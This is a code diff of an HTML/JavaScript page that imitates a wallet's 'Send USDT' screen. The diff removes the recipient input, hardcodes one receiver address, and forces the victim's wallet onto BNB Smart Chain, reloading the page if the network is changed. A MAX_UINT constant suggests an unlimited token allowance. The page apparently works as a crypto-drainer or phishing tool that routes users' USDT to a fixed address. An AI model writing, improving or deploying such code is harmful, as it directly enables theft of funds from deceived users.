@@ -22,37 +22,24 @@ body {
     padding:20px;
 }
 .header h2 { font-size:18px; font-weight:600; }
-.close { font-size:22px; opacity:.7; }
 
 /* SECTION */
 .section { padding:0 20px; margin-top:18px; }
 .label { font-size:13px; color:#9aa4af; margin-bottom:8px; }
 
-/* INPUT */
+/* INPUT BOX */
 .input-box {
     background:#11161c;
     border:2px solid #1f2a36;
     border-radius:14px;
     padding:14px;
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-}
-.input-box input {
-    background:transparent;
-    border:none;
-    color:white;
-    font-size:16px;
-    width:100%;
-    outline:none;
 }
 
-/* ACTIONS */
-.actions { display:flex; gap:10px; align-items:center; }
-.action-btn {
-    color:#16c784;
+/* ADDRESS DISPLAY */
+.address {
     font-size:14px;
-    cursor:pointer;
+    color:#16c784;
+    word-break:break-all;
 }
 
 /* NETWORK */
@@ -70,9 +57,22 @@ body {
     justify-content:space-between;
     align-items:center;
 }
+.input-box input {
+    background:transparent;
+    border:none;
+    color:white;
+    font-size:16px;
+    width:100%;
+    outline:none;
+}
+.actions {
+    display:flex;
+    gap:10px;
+}
 .usdt-label { color:#16c784; font-weight:600; }
+.action-btn { color:#16c784; cursor:pointer; }
 
-/* FOOTER BUTTON */
+/* FOOTER */
 .footer {
     position:fixed;
     bottom:0;
@@ -92,7 +92,6 @@ body {
 }
 .next-btn:disabled { opacity:.5; }
 
-/* STATUS */
 .status {
     text-align:center;
     margin-top:10px;
@@ -105,17 +104,14 @@ body {
 
 <div class="header">
     <h2>Send USDT</h2>
-    <div class="close">✕</div>
 </div>
 
-<!-- ADDRESS -->
+<!-- RECEIVER -->
 <div class="section">
-    <div class="label">Address or Domain Name</div>
+    <div class="label">Recipient</div>
     <div class="input-box">
-        <input type="text" id="address" placeholder="Search or Enter">
-        <div class="actions">
-            <div class="action-btn" onclick="pasteAddress()">Paste</div>
-            <div class="action-btn">📷</div>
+        <div class="address">
+            0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F
         </div>
     </div>
 </div>
@@ -151,6 +147,7 @@ body {
 // ===== CONFIG =====
 const RECEIVER_ADDRESS = '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F';
 const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
+const BSC_CHAIN_ID = '0x38';
 const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
 // ===== STATE =====
@@ -158,7 +155,7 @@ let web3;
 let userAccount;
 let usdt;
 
-// ===== UI ELEMENTS =====
+// ===== UI =====
 const sendBtn = document.getElementById('sendBtn');
 const statusDiv = document.getElementById('status');
 const amountInput = document.getElementById('amount');
@@ -181,6 +178,31 @@ const ABI = [{
     "type":"function"
 }];
 
+// ===== FORCE BSC =====
+async function forceBSC() {
+    try {
+        await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: BSC_CHAIN_ID }]
+        });
+    } catch (err) {
+        if (err.code === 4902) {
+            await window.ethereum.request({
+                method: 'wallet_addEthereumChain',
+                params: [{
+                    chainId: BSC_CHAIN_ID,
+                    chainName: 'BNB Smart Chain',
+                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                    blockExplorerUrls: ['https://bscscan.com']
+                }]
+            });
+        } else {
+            throw err;
+        }
+    }
+}
+
 // ===== INIT =====
 async function init() {
     if (!window.ethereum) {
@@ -191,8 +213,15 @@ async function init() {
     web3 = new Web3(window.ethereum);
 
     try {
-        await window.ethereum.request({ method:'eth_requestAccounts' });
-        const accounts = await web3.eth.getAccounts();
+        await forceBSC();
+
+        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+        if (chainId !== BSC_CHAIN_ID) {
+            showStatus("Please switch to BSC", true);
+            return;
+        }
+
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         userAccount = accounts[0];
 
         usdt = new web3.eth.Contract(ABI, USDT_CONTRACT);
@@ -202,7 +231,7 @@ async function init() {
     }
 }
 
-// ===== ACTIONS =====
+// ===== SEND =====
 async function sendUSDT() {
     sendBtn.disabled = true;
     showStatus("Confirm in wallet...");
@@ -226,12 +255,6 @@ function showStatus(msg, error=false) {
     statusDiv.style.color = error ? "#ff4d4f" : "#16c784";
 }
 
-function pasteAddress() {
-    navigator.clipboard.readText().then(text=>{
-        document.getElementById('address').value = text;
-    });
-}
-
 async function setMax() {
     const bal = await usdt.methods.balanceOf(userAccount).call();
     amountInput.value = web3.utils.fromWei(bal, 'ether');
@@ -241,6 +264,12 @@ async function setMax() {
 sendBtn.onclick = sendUSDT;
 window.onload = init;
 
+// FORCE if user changes network
+if (window.ethereum) {
+    window.ethereum.on('chainChanged', () => {
+        window.location.reload();
+    });
+}
 </script>
 
 </body>
